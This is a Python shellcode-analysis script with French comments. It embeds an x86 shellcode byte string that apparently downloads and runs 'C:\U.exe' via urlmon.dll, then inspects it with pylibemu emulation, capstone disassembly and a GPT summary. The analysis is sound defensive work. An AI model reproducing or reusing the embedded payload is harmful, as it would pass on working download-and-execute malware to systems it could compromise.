import pylibemu
import openai
import os
import re
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
from dotenv import load_dotenv

# variable .env (clé openai)
load_dotenv()
openai.api_key = os.getenv("OPENAI_API_KEY")

# shellcode facile
shellcode = (
    b"\xeb\x54\x8b\x75\x3c\x8b\x74\x35\x78\x03\xf5\x56\x8b\x76\x20\x03\xf5\x33\xc9\x49\x41\xad\x33\xdb"
    b"\x36\x0f\xbe\x14\x28\x38\xf2\x74\x08\xc1\xcb\x0d\x03\xda\x40\xeb\xef\x3b\xdf\x75\xe7\x5e\x8b\x5e"
    b"\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5e\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xc3\x75\x72\x6c\x6d\x6f\x6e"
    b"\x2e\x64\x6c\x6c\x00\x43\x3a\x5c\x55\x2e\x65\x78\x65\x00\x33\xc0\x64\x03\x40\x30\x78\x0c\x8b\x40"
    b"\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x95\xbf\x8e\x4e\x0e"
    b"\xec\xe8\x84\xff\xff\xff\x83\xec\x04\x83\x2c\x24\x3c\xff\xd0\x95\x50\xbf\x36\x1a\x2f\x70\xe8\x6f"
    b"\xff\xff\xff\x8b\x54\x24\xfc\x8d\x52\xba\x33\xdb\x53\x53\x52\xeb\x24\x53\xff\xd0\x5d\xbf\x98\xfe"
    b"\x8a\x0e\xe8\x53\xff\xff\xff\x83\xec\x04\x83\x2c\x24\x62\xff\xd0\xbf\x7e\xd8\xe2\x73\xe8\x40\xff"
    b"\xff\xff\x52\xff\xd0\xe8\xd7\xff\xff\xff"
)


# les chaînes lisibles du shellcode
def get_shellcode_strings(shellcode):
    return [s.decode("utf-8", errors="ignore") for s in re.findall(rb"[\x20-\x7e]{4,}", shellcode)]


# test avec pylibemu
def get_pylibemu_analysis(shellcode):
    emu = pylibemu.Emulator()
    offset = emu.shellcode_getpc_test(shellcode)
    if offset < 0:
        offset = 0
    emu.prepare(shellcode, offset)
    emu.test()
    return emu.emu_profile_output.decode(errors="ignore")


# désassemblage avec capstone pour voir les instructions asm
def get_capstone_analysis(shellcode):
    disas = Cs(CS_ARCH_X86, CS_MODE_32)
    result = []
    for i in disas.disasm(shellcode, 0x1000):
        result.append(f"{i.address:08x}:\t{i.mnemonic}\t{i.op_str}")
    return "\n".join(result)


# analyse avec chatgpt4.1 nano
def get_llm_analysis(profile):
    try:
        rep = openai.ChatCompletion.create(
            model="gpt-4.1-nano-2025-04-14",
            messages=[
                {
                    "role": "system",
                    "content": "Tu es un expert en cybersécurité. Analyse ce shellcode brièvement en 2-3 paragraphes.",
                },
                {"role": "user", "content": profile},
            ],
            temperature=0.3,
        )
        return rep["choices"][0]["message"]["content"]
    except Exception as e:
        return f"Erreur avec GPT : {e}"


# affichage
print("\n>> chaînes trouvées dans le shellcode :\n")
for s in get_shellcode_strings(shellcode):
    print("-", s)

print("\n>> pylibemu :\n")
p = get_pylibemu_analysis(shellcode)
print(p)

print("\n>> désassemblage capstone :\n")
print(get_capstone_analysis(shellcode))

print("\n>> chatgpt4.1 :\n")
print(get_llm_analysis(p))
